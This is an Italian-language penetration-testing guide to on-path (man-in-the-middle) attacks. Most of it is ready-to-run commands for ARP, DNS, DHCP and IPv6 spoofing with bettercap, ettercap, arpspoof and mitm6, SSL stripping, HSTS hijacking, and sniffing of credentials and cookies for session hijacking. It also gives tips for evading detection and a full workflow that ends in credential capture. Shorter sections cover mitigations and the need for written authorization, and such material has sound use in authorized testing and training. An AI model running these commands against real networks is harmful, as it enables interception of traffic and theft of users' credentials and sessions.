# On-Path Attacks (Man-in-the-Middle)

## Scopo

Questa guida copre gli attacchi on-path (precedentemente noti come Man-in-the-Middle), dove l'attaccante si posiziona tra due parti comunicanti per intercettare, modificare o iniettare traffico.

## Prerequisiti

- Kali Linux o distribuzione con tool di pentesting
- Bettercap, Ettercap, arpspoof
- Accesso alla rete locale target
- **Autorizzazione scritta** per i test
- Conoscenza di networking (ARP, DNS, TCP/IP)

## Installazione

```bash
sudo apt-get update
sudo apt-get install bettercap ettercap-graphical dsniff
```

---

## ARP Spoofing

### Come Funziona

```
1. Attacker invia ARP reply falsi
2. Victim aggiorna ARP cache con MAC attacker
3. Traffico verso gateway passa per attacker
4. Attacker forwarda a gateway reale
```

### Bettercap

```bash
# Avvia bettercap
sudo bettercap -iface eth0

# Abilita ARP spoofing
» net.probe on
» set arp.spoof.targets 192.168.1.10
» arp.spoof on

# Sniff traffico
» net.sniff on

# Full duplex (spoof gateway e target)
» set arp.spoof.fullduplex true
» arp.spoof on
```

### Arpspoof

```bash
# Abilita IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof gateway verso victim
sudo arpspoof -i eth0 -t victim_ip gateway_ip

# Spoof victim verso gateway (altro terminale)
sudo arpspoof -i eth0 -t gateway_ip victim_ip
```

### Ettercap

```bash
# GUI
sudo ettercap -G

# CLI - scan hosts
sudo ettercap -T -M arp:remote /victim_ip// /gateway_ip//

# Con sniffing
sudo ettercap -T -q -M arp:remote -i eth0 /victim_ip// /gateway_ip//
```

---

## DNS Spoofing

### Con Bettercap

```bash
# Crea file hosts per spoofing
echo "192.168.1.100 *.example.com" > spoof.hosts

# Avvia DNS spoofing
» set dns.spoof.domains example.com
» set dns.spoof.address 192.168.1.100
» dns.spoof on
```

### Con Ettercap

```bash
# Modifica /etc/ettercap/etter.dns
*.example.com A 192.168.1.100

# Avvia con plugin
sudo ettercap -T -q -M arp:remote -P dns_spoof /victim_ip// /gateway_ip//
```

---

## HTTPS Downgrade / SSL Strip

### SSLstrip (Legacy)

```bash
# Abilita forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Redirect HTTP a SSLstrip
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# Avvia SSLstrip
sslstrip -l 8080

# Log in sslstrip.log
```

### Bettercap hstshijack

```bash
# Per siti con HSTS
» set hstshijack.targets example.com
» set hstshijack.replacements example.com
» hstshijack on
```

---

## Credential Sniffing

### Bettercap

```bash
# Sniff credenziali HTTP
» net.sniff on
» set net.sniff.local true
» set net.sniff.verbose true

# Output
[net.sniff.http.request] http://example.com/login
POST /login
username=admin&password=secret123
```

### Ettercap

```bash
# Con parsing automatico
sudo ettercap -T -q -M arp:remote /victim// /gateway//

# Cerca output come:
HTTP : 192.168.1.10:80 -> USER: admin  PASS: password
```

---

## Session Hijacking

### Cookie Theft

```bash
# Con Bettercap, sniffa cookies
» net.sniff on

# Cerca Set-Cookie e Cookie headers
# Importa cookie nel browser per session hijacking
```

### Ferret & Hamster (Legacy)

```bash
# Cattura sessioni
ferret -i eth0

# Visualizza sessioni
hamster
# Accedi a http://localhost:1234
```

---

## DHCP Spoofing

```bash
# Bettercap DHCP spoofing
» set dhcp.spoof.dns 192.168.1.100
» set dhcp.spoof.gateway 192.168.1.100
» dhcp.spoof on

# I nuovi client riceveranno DNS/gateway malevoli
```

---

## IPv6 Attacks

### Router Advertisement Spoofing

```bash
# Bettercap
» set ndp.spoof.targets fe80::1
» ndp.spoof on

# Mitm6
sudo mitm6 -d domain.com
```

---

## Detection e Evasione

### Detection

```bash
# Monitoraggio ARP
arpwatch -i eth0

# Wireshark filter
arp.duplicate-address-detected
```

### Evasione

```bash
# MAC randomization
macchanger -r eth0

# Rate limiting
set arp.spoof.interval 1000
```

---

## Mitigazioni

### Static ARP

```bash
# Windows
arp -s gateway_ip gateway_mac

# Linux
arp -s gateway_ip gateway_mac
```

### Dynamic ARP Inspection (DAI)

```
# Switch Cisco
ip arp inspection vlan 10
```

### DHCP Snooping

```
# Switch Cisco
ip dhcp snooping
ip dhcp snooping vlan 10
```

### 802.1X

- Autenticazione port-based
- Impedisce accesso non autorizzato

### Encryption

- HTTPS everywhere
- VPN per traffico sensibile
- SSH invece di Telnet

---

## Workflow Completo

```bash
# 1. Scan rete
sudo bettercap -iface eth0
» net.probe on
» net.show

# 2. Seleziona target
» set arp.spoof.targets 192.168.1.10

# 3. Abilita ARP spoof
» set arp.spoof.fullduplex true
» arp.spoof on

# 4. Sniff traffico
» net.sniff on

# 5. (Opzionale) DNS spoof
» set dns.spoof.domains login.example.com
» set dns.spoof.address 192.168.1.100
» dns.spoof on

# 6. Cattura credenziali
# Monitora output per username/password
```

---

## Best Practices

- **Scope limitato**: Solo target autorizzati
- **Impatto minimo**: Monitora stabilità rete
- **Logging**: Mantieni log di tutte le attività
- **Cleanup**: Ripristina ARP cache dopo test
- **Legal**: Assicura autorizzazione scritta
- **Etica**: Non utilizzare dati catturati impropriamente

## Riferimenti

- [Bettercap Documentation](https://www.bettercap.org/docs/)
- [Ettercap](https://www.ettercap-project.org/)
- [MITRE ATT&CK - ARP Spoofing](https://attack.mitre.org/techniques/T1557/002/)
- [OWASP - MITM](https://owasp.org/www-community/attacks/Manipulator-in-the-middle_attack)
